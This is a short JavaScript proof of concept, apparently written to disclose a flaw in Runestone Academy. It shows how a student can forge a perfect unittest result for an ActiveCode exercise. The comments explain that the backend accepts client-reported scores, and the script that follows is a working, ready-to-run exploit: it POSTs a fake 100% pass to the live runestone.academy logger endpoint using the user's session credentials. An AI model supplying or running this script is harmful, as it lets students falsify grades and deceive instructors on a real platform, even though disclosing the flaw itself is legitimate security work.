// Proof of Concept: ActiveCode Spoofing in Runestone Academy
//
// Similar to McqAnswerSpoof.js, this PoC demonstrates a client-side vulnerability
// in the ActiveCode activity type. Users can submit a forged unittest result via the
// `bookevent` endpoint and falsely report a perfect test pass rate—bypassing actual code execution.
//
// Exploit Behavior:
// - The `"percent:100.00"` and `"passed:100"` values are blindly accepted by the backend.
// - No server-side verification is performed on the reported results.
// - As a result, users can receive full credit for unattempted or incorrect code.
//
// Note: The ActiveCode activity can be spoofed via the same method as McqAnswerSpoof

(async () => {
    // Prompt user to enter the question ID (e.g., "challenge-9-2-Square-Rectangle")
    const divId = prompt("Enter Question ID:");

    // Parse assignment ID from the current URL
    const urlParams = new URLSearchParams(window.location.search);
    const assignmentId = urlParams.get("assignment_id") || urlParams.get("_id");

    if (!divId){
        alert("No question ID entered, run again.");
        return;
    }
    if (!assignmentId) {
        alert("Assignment ID not found.");
        return;
    }

    // Spoof a perfect ActiveCode submission using the logger endpoint
    await fetch("https://runestone.academy/ns/logger/bookevent", {
        method: "POST",
        mode: "cors",
        credentials: "include",
        headers: {
            "Accept": "application/json",
            "Content-Type": "application/json; charset=utf-8",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
            "Accept-Language": "en-US,en;q=0.9",
            "Referer": `https://runestone.academy/assignment/student/doAssignment?assignment_id=${assignmentId}`
        },
        body: JSON.stringify({
            act: "percent:100.00:passed:100:failed:0", // Fake 100% test pass
            div_id: divId,
            event: "unittest",
            course_name: eBookConfig.course,
            clientLoginStatus: true,
            timezoneoffset: 4,
            assignment_id: assignmentId
        })
    });

    alert("Spoofed ActiveCode submission sent. Refresh to update score.");
})();
